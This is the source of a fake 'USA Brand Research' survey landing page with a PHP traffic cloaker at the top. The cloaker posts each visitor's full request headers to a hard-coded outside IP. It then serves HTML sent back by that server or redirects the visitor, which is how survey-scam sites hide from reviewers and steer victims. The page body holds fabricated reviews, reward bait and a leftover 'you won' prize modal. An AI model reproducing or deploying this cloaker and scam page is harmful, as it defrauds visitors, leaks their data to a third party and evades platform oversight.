<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "def4975f69";
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405714786";
            $headers['TS-BHDNR-74194'] = "def4975f69"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
               if(isset($response->zrc) && !empty($response->zrc)){
                    echo base64_decode($response->zrc);
                    die();
                }else{                        
                    if($response->type == 1){
                        $this->get_url($response->url,$response->http_code);
                    }
                }
            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USA Brand Research</title>

    <link rel="icon" href="assets/favicon.png">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.1/css/bootstrap.min.css">




	
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.1/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css" />
    <link rel="stylesheet" type="text/css" href="assets/style.css?45">
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.js"></script>






	
</head>
<body>



	<header>
		<div class="container text-center">
			<a href="index.php"><img src="assets/logo.png" class="img-responsive"></a>
		</div>
	</header>

	<section id="content1" class="hero">
		<div class="container">
		  
		  
		     <div class="row inner-row" >
		  	    <div class="main-content flag" id="questions_all" data-total="4">
		  	   
              <div class="ui progress " data-value="0" data-total="4" id="eg">
                  <div class="bar">
                     <div class="progress"></div>
                  </div>
             </div>
		  	     <div id="q1" > 
		  	     	<div class="title text-center">
		  	          <h2>Which design do you like the most?</h2>
		  	             <p>By giving answers to such simple questions, you can get rewards</p>
		          </div>
		  	     <div class="d-flex align-items-center justify-content-center mt-3">
		  	     	<div class="p-1 bq  bq1 position-relative   ui-button" data-question="1" data-bq="1">
		  	 	  	<a href="#"  ><img src="assets/1.jpg" class="borders"></a>
		  	 	  	<div class="number"><p>1</p></div>
		  	 	    </div>
		  	 	    <div class="p-1 bq  bq1 position-relative ui-button" data-question="1" data-bq="1">
		  	 	  	<a href="#" ><img src="assets/2.jpg" class="borders"></a>
		  	 	  	<div class="number"><p>2</p></div>
		  	 	    </div>
		  	 	</div>
		  	 	 <div class="d-flex align-items-center justify-content-center">
		  	 	   <div class="p-1 bq  bq1 position-relative ui-button" data-question="1" data-bq="1">
		  	 	  	<a href="#"><img src="assets/3.jpg" class="borders"></a>
		  	 	  	<div class="number"><p>3</p></div>
		  	 	  </div>
		  	 	  <div class="p-1  bq bq1 position-relative ui-button" data-question="1" data-bq="1">
		  	 	  	<a href="#" ><img src="assets/4.jpg" class="borders"></a>
		  	 	  	<div class="number"><p>4</p></div>
		  	 	  </div>
		  	     </div>	
		  	 	  
		  	
		      </div>

		      <div id="q2">
		      	   <p class="question"><strong>Question 1 of 3:</strong>&nbsp;<span>What factors influence your buying decision when opting for a beverage brand?</span></p>
                        <div class="survey_button bq bq2 ui-button" data-question="2" data-bq="1">Quality </div>
                        <div class="survey_button bq bq2 ui-button" data-question="2" data-bq="2">Brand Reputation</div>
                        <div class="survey_button bq bq2 ui-button" data-question="2" data-bq="3">Product Innovation</div>
                        <div class="survey_button bq bq2 ui-button" data-question="2" data-bq="4">Pricing</div>
		      </div>
		      <div id="q3">
                        <p class="question"><strong>Question 2 of 3:</strong>&nbsp;<span>How do you typically learn about new US brands or products?</span></p>
                        <div class="survey_button bq bq3 ui-button" data-question="3" data-bq="1">Social Media</div>
                        <div class="survey_button bq bq3 ui-button" data-question="3" data-bq="2">Word of Mouth</div>
                        <div class="survey_button bq bq3 ui-button" data-question="3" data-bq="3">Email Marketing</div>
                        <div class="survey_button bq bq3 ui-button" data-question="3" data-bq="4">In-Store Promotions</div>
              </div>
              <div id="q4">
                        <p class="question"><strong>Question 3 of 3:</strong>&nbsp;<span>Are you over 18 years old?
                    
                        <div class="survey_button bq bq4 ui-button" data-question="4" data-bq="1">Yes</div>
                        <div class="survey_button bq bq4 ui-button" data-question="4" data-bq="2">No</div>
                 
              </div>
		</div>
	</div>
     
   

		</div>
	</section>

	<section class="main-content" id="content2">
	  <div class="container">
		  <div class="title text-center">
		  	        <h2>We are checking...</h2>
		  	    <div class="d-flex justify-content-center">
                    <div class="spinner-border m-3" role="status"><span class="sr-only">Loading...</span></div>
               </div>
                <p class="result" id="result1">Just wait for a few more seconds </p>
                <p class="result" id="result2">Your vote has been processed </p>
                <p class="result" id="result3">Roll up your sleeves and get ready for the results </p>
		  </div>
	</div>
	</section>



	<!-- about -->
 
 <section class="about bg-color">
   <div class="container">
   	    <div class="row">
   	    	 <div class="col-lg-6 align-middle">
   	    	<div class="title">
		  	<h2>About USA Brand Research</h2>
		  	<p>USA Brand Research is trusted for comprehensive insights into the diverse range of products and brands in the US. We are a renowned and dedicated company that is committed to providing valuable data and analysis to help consumers and industries make informed decisions. </p>
		  
		  </div>
   	    	 </div>
   	    	  <div class="col-lg-6 text-center">
   	    	 	 <img src="assets/about.jpg" class="img-fluid ">
   	    	 </div>
   	    </div>
   </div>	
 </section>
	
	<!-- Video -->
	<section class="video ">
		 <div class="container">
		  <div class="title text-center">
		  	<h2>Genuine Surveys</h2>
		  	<p>Surveys That Bring Reliable and Primary Data From Individuals</p>
		  </div>
		  <div class="row">
		  	<div class="col-lg-4">
		  		<img src="assets/post1.jpg" class="img-fluid ">


		  	</div>
		  	<div class="col-lg-4">
		  	<img src="assets/post2.jpg" class="img-fluid ">


		  	</div>
		  	<div class="col-lg-4">
		  		<img src="assets/post3.jpg" class="img-fluid ">


		  	</div>
		  </div>
		 </div>
	</section>

	<!-- Review -->
	<section class="review bg-color">
		 <div class="container">

		  <div class="title text-center">
		  	<h2>Reviews</h2>
		  	<p>Here’s what people say when they get a new smartphone from us. </p>
		  </div>

		 	  <div class="row">
		 	  	<div class="owl-carousel owl-theme">
      <div class="owl-item">
		 	  	    <div class="mb-5 mb-md-0 text-center">
                            <div class="d-flex justify-content-center mb-4">
                               <img src="assets/test1.jpg" class="rounded-circle shadow-1-strong" width="150" height="150" />
                            </div>
                            <h5 class="mb-3">Jane D. Richardson</h5>
                            <p class="px-xl-3"><i class="fas fa-quote-left pe-2"></i>I've tried various product research programs, but this one stands out. It's a win-win situation for both consumers and brands. You get to influence product development and enjoy free samples. Highly recommended!</p>
                            <ul class="list-unstyled d-flex justify-content-center mb-0">
                            <li><i class="fas fa-star fa-sm text-warning"></i></li>
                            <li><i class="fas fa-star fa-sm text-warning"></i></li>
                            <li><i class="fas fa-star fa-sm text-warning"></i></li>
                            <li><i class="fas fa-star fa-sm text-warning"></i></li>
                            <li><i class="fas fa-star-half-alt fa-sm text-warning"></i> </li>
                            </ul>
                   </div>
            </div>  
           <div class="owl-item">      
                   <div class="mb-5 mb-md-0 text-center">
                           <div class="d-flex justify-content-center mb-4">
                             <img src="assets/test2.jpg" class="rounded-circle shadow-1-strong" width="150" height="150" />
                           </div>
                           <h5 class="mb-3">Sara M. Flynn</h5>
                           <p class="px-xl-3"><i class="fas fa-quote-left pe-2"></i>I had a fantastic experience with USA Brand Research. Their platform allowed me to vote on products and receive samples. It's such a fun and interactive way to discover new products. I've found some real gems through their service!</p>
                            <ul class="list-unstyled d-flex justify-content-center mb-0">
                               <li><i class="fas fa-star fa-sm text-warning"></i></li>
                               <li><i class="fas fa-star fa-sm text-warning"></i></li>
                               <li><i class="fas fa-star fa-sm text-warning"></i></li>
                               <li><i class="fas fa-star fa-sm text-warning"></i></li>
                               <li><i class="fas fa-star fa-sm text-warning"></i></li>
                           </ul>
                   </div>
               </div>
               <div class="owl-item">    
                   <div class="mb-0 text-center">
                        <div class="d-flex justify-content-center mb-4">
                           <img src="assets/test3.jpg" class="rounded-circle shadow-1-strong" width="150" height="150" />
                        </div>
                        <h5 class="mb-3">Ira B. Malone</h5>
                         <p class="px-xl-3"><i class="fas fa-quote-left pe-2"></i>As a consumer, I love USA Brand Research! Their concept of letting us vote on products and get samples is innovative. Plus, it's a great way to stay updated on the latest trends in the market. Highly recommend!</p>
                         <ul class="list-unstyled d-flex justify-content-center mb-0">
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="far fa-star fa-sm text-warning"></i></li>
                        </ul>
                  </div>
                 </div> 

                   <div class="owl-item">    
                   <div class="mb-0 text-center">
                        <div class="d-flex justify-content-center mb-4">
                           <img src="assets/test4.jpg" class="rounded-circle shadow-1-strong" width="150" height="150" />
                        </div>
                        <h5 class="mb-3">Wayne A. Patterson</h5>
                         <p class="px-xl-3"><i class="fas fa-quote-left pe-2"></i>USA Brand Research has changed the way I think about marketing research. Being able to vote on products and try them out before they launch is exciting. It's a brilliant concept that benefits both consumers and brands</p>
                         <ul class="list-unstyled d-flex justify-content-center mb-0">
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="fas fa-star fa-sm text-warning"></i></li>
                             <li><i class="far fa-star fa-sm text-warning"></i></li>
                        </ul>
                  </div>
                 </div> 
               
              </div>
		 	  </div>
		 </div>
	</section>

	<!-- Footer -->
	<footer class="footer">
		<div class="container">
			 <div class="row text-center">
			 	<ul class=" legal text-center">
			 		<li><a href="privacy.html">Privacy Policy</a></li>
			 		<li><a href="contact.html">Contact Us</a></li>
			 	</ul>
			 	 <p>The information provided on the USA Brand Research website is for general informational purposes only. While we strive to keep the information up-to-date and accurate, we make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability of the information contained on the website or the information, products, services, or related graphics contained on the website for any purpose.</p>
			 	 <p>Any reliance you place on the information provided on this website is strictly at your own risk. We do not endorse or recommend any specific brands, products, or services mentioned on this website.</p>
			 	 <p>Participation in surveys or other activities on our website is voluntary. We do not guarantee any rewards, incentives, or benefits for participation, and any rewards provided are subject to change or availability.</p>
			 	 <p>Our website may contain links to external websites that are not under our control. We have no control over the nature, content, and availability of those sites. The inclusion of any links does not necessarily imply a recommendation or endorsement of the views expressed within them.</p>
			 	 <p>© <script>document.write(new Date().getFullYear())</script> Company. All Rights Reserved.</p>
			 </div>
		</div>
	</footer>
</div>


<!-- Modal -->
<!-- <div class="modal fade" id="myModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="staticBackdropLabel"></h5>
        <button type="button" class="btn-close bq4" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body text-center">
       <img src="assets/gift.png">
       <h2>congrats </h2>
       <h4>you are the 1000th person choosing this design</h4>
       <p>you won "XYZ"</p>
      </div>
    
    </div>
  </div>
</div> -->




<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/owl.carousel.js"></script> 
<script type="text/javascript" src="assets/main.js"></script>
 <script type="text/javascript">var portal = 'en'; var theme = '82-auchan'; var template = 'surbox'; var brand_country = 'English'; var dayNames = Array("Sunday", "Monday", "Tuesday", "Wednesday","Thursday", "Friday", "Saturday"); var monthNames = new Array("January", "February", "March", "April", "May", "June", "July","August", "September", "October", "November", "December"); var img_regalo = "3vxw72pf86.png"; var minutos_y = "Minute "; var segundos = "Secondes"; var url_f = ""; var modalOptions = { backdrop: 'static', keyboard: false };</script>


<script type="text/javascript" src="assets/question.js"></script>
 <script>
        $('.ui-button').on('click', function () {
            $('.progress').progress('increment');
        });
    </script>
    <script type="text/javascript">

</script>

</body>
</html>